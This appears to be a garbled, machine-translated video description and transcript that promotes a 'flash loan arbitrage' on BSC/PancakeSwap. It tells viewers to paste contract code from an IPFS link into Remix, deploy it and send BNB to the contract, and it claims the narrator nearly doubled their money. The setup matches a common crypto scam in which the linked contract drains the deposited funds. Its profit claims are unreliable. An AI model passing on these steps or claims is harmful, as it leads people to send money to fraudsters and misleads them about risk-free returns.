description: Donations: 0x01C65F22A9478C2932E62483509C233F0AAD5C72  Links to resources are found below. Remix Ide: http://remix.ethereum.org  Flash loan contract code: https://gateway.pinata.cloud/ipfs/qmwwne4cr3qjaAmicztygcuarhnxe6kwy9dr45Pwzf54ca?_gl=1*tqwgyk *_GA*NJM3MZI2ODGUMTY2NZY2MTC5MW ..*_ GA_5RMPXG14TE*MTY3TM4MTU5MY4XMY4XLJE2NZUZUZODE2NZYUNTEUMC4W   The present video is educational, however it is a way to gain some crypts using the arbitration method using Smart Contracts (flashloan). We use the Flash loan method for self -bargaining on the BSC network, precisely in Pancakeswap. Flash loans are programmable contracts that we use to acquire loans between two blockchain blocks. This gives us the opportunity to obtain minimal rate or minimum rate loans between two extraction time blocks. Only gas rates are paid when executing a FLAH loan. This process is easily carried out by implementing an intelligent contract in the BSC network through Remix, exchanging in the pancakeswap exchange. All this happens within a single blockchain transaction and the transfer is carried out automatically using the smart contract. With the loan, arbitration opportunities are evaluated and the transaction is executed. During the extraction of the second block, the money borrowed will be reimbursed and, therefore, the loan is returned. Once all these processes have been successfully executed, the transaction profits will be accredited in their wallet and will have successfully executed a BSC arbitration.  Flashloan contract implementation  1-ABRA REMIX IDE: http: //remix.ethereum.org  2-Create a new file and paste the flashloan contract from the link: :right arrow:https: //gateway.pinata.cloud/ipfs/qmwwne4cr3qjaAmicztygcuarhnxe6kwy9dr45Pwzf54ca? _Gl = 1*tqwgy K*_GA*NJM3MZI2ODGUMTY2NZY2MTC5MW ..*_ GA_5RMPXG14TE*MTY3TM4MTU5MY4XMY4XLJE2NZUZUZODE2NZYUNTEUMC4W  3-Configure The version version version at 0.5.0 | Change the environment to Injected Web3.   4-CREE YOUR CONTRACT COMPRESSING "_CONTRACTNAME" AND "_CONTRACTSYmbol" with the amount of the loan established in 1000. Click Transact to implement when it is finished.   5-Pay the gas of your intelligent contract implemented with the BNB you have (0.25bnb per 1000BNB borrowed).   6-last, click "Action" to execute the arbitration and voila.   Note: Sometimes, arbitration can fail due to BNB's exhaustion in its intelligent contract, since the price of gas varies from time to time. Do not worry, wait a minute and try the transaction again this time, preferably with a 900 loan amount and a higher gas limit. Immediately we go to Remix. Remix is an interface that uses the Ethereum Virtual Machine to be able to deploy and program smart contracts the link is in the description here we have the entire interface where we can and we will perform the contract in the link in the description I link the contract to which we are going to copy and here in remix we proceed to create the file .sol We go here to this icon, create new file and we will place the name of Flashlogan.bsc.sol Once created, paste the code. Here we have our contract, here we have our dependencies that are in our repository. We see that the Solidity version is 5.0, so we proceed to the compiler. We change the version 5.0 and we proceed to compile. It was compiled perfectly. Now let's go to deployment on the Binance network for which we choose inject web 3 which will connect us with our wallet that as we saw at the beginning it consists of 1.3 B we have to review, it is the same wallet, 1.3 bnb now before deploying we have to complete the variables that it ask us In which we have the name of the contract in this case we will put We will name the contract, Flash Loan, the symbol is EFL to go to a loan of 1000 BNB note that these are opportunities that the flashloan contracts find they depend on the movement that there is in the market and is the possibility that it finds in the exchange in question We proceed to make the transaction here it is pending we confirm Confirmed Perfect! We already have our contract deployed in the network we copy its address address to our wallet we put Send the address to the contract here What we are doing is giving the necessary gas so that they can act interact with the protocols in this case with package swap for which for every 1000 BNB that we ask loan we need as a minimum according to the contract code about 0.25 BNB I put 0.25 BNB I place 0.25 BNB And proceed to do the operation We confirm Wait is pending. Perfect! The operation is already being carried out. then proceed to execute the contract. Display the option that REMIX and we go to the action function. so let's say action we confirm and now we will have to wait to see if we have the chance to make any difference oh what good luck the truth is that we have received an important quantity of bnb in our account we have almost doubled what I had originally the transaction was carried out successfully I leave all the links in the description and I ask you again please subscribe to the channel and good luck in case to be able to do a network operation
